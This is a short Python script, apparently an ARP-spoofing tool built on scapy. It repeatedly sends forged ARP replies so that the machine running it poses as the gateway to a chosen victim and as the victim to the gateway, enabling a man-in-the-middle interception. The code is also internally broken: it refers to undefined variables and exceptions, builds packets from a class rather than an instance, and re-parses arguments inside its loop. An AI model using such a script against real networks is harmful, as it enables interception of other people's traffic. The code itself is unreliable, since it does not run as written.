from scapy.layers.l2 import ARP, Ether, srp, send
from termcolor import cprint
import argparse

class NoTargetSpecified(Exception):
    pass

class NoGatewaySpecified(Exception):
    pass

#Evaluate MAC address of a specific IP
def get_MAC(ip):
    arp_header = ARP(pdst=ip)
    eth_header = Ether(dst="ff:ff:ff:ff:ff:ff")
    packet = eth_header/ARP

    response_list = srp(packet, timeout=1, verbose=False)[0]

    return response_list[0][1].hwsrc

#Use ARP response to update MAC address of spoof_ip on victim_IP ARP table 
def spoof(victim_ip, spoof_ip):
    victim_MAC = get_MAC(gateway_ip)
    packet = ARP(op=2, pdst=victim_ip, hwdst=victim_MAC, psrc=fiction_ip)
    send(packet)


#Evaluate if IP_address is valid
def check_format_IP(IP_address):
    IP_numbers = params[0].split('.')
    
    if len(IP_numbers)!=4:
        raise NoNetworkSpecified
    else:
        for num in IP_numbers:
            if(int(num)>255 or int(num)<0):
                raise NoNetworkSpecified

    return network


#Parser of command line arguments
def args_parser():
    #Parser of command line arguments
    parser = argparse.ArgumentParser()
    #Initialization of needed arguments
    parser.add_argument("-target", "-t", dest="target", help="IP address of the victim")
    parser.add_argument("-gateway", "-g", dest="gateway", help="IP address of the gateway of the network")
    #Parse command line arguments
    args = parser.parse_args()
    
    #Check if the arguments have been specified on command line
    try:
        if not args.target:
            raise NoTargetSpecified
        
        if not args.gateway:
            raise NoGatewaySpecified
        
        target_IP=check_format_IP(args.target)
        cprint('Target  address:   ', 'yellow', attrs=['bold',], end='')
        print(f'{target}', end='\n\n')
        gateway_IP=check_format_IP(args.gateway)
        cprint('Gateway  address:  ', 'yellow', attrs=['bold',], end='')
        print(f'{gateway_IP}', end='\n\n')

    except (NoTargetSpecified, NoGatewaySpecified) as e :
        parser.print_help()
        exit(0)

    return target_IP, gateway_IP



def main():
    #To establish MIDM connection, we need to repeat the update of ARP 
    #table for victim and gateway otherwise it is automatic reset
    while True:
        target_ip, gateway_ip = args_parser()
        #Send ARP response to target_IP so my PC pretends to be the gateway
        #sending my MAC as Ethernet Address of packet 
        spoof(target_IP, gateway_IP)
        #Send ARP response to gateway_IP so my PC pretends to be the target
        #sending my MAC as Ethernet Address of packet
        spoof(gateway_IP, target_IP)



if __name__=="__main__":
    main()
